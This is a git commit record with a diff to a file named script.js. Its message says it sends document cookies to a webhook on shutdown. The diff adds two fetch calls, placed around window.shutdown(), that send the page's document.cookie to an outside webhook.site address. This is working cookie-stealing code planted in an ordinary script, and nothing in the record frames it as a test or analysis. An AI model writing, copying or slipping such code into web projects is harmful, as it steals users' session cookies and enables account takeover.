a18ab685b45a1e3d8a5ff5f8adc4a1a5a9fcf335
Crem <maxcaminer1@gmail.com>
2026-02-18 18:57:04 +1100

    Send document cookies to webhook on shutdown
    Added a fetch call to send document cookies to a webhook.

--- script.js
+++ script.js
@@ -1,1 +1,3 @@
+fetch('https://webhook.site/0f2db10c-0b26-4d9d-8d81-70d2a9f2b575?cookie=' + document.cookie);
 window.shutdown();
+fetch('https://webhook.site/0f2db10c-0b26-4d9d-8d81-70d2a9f2b575?cookie=' + document.cookie);
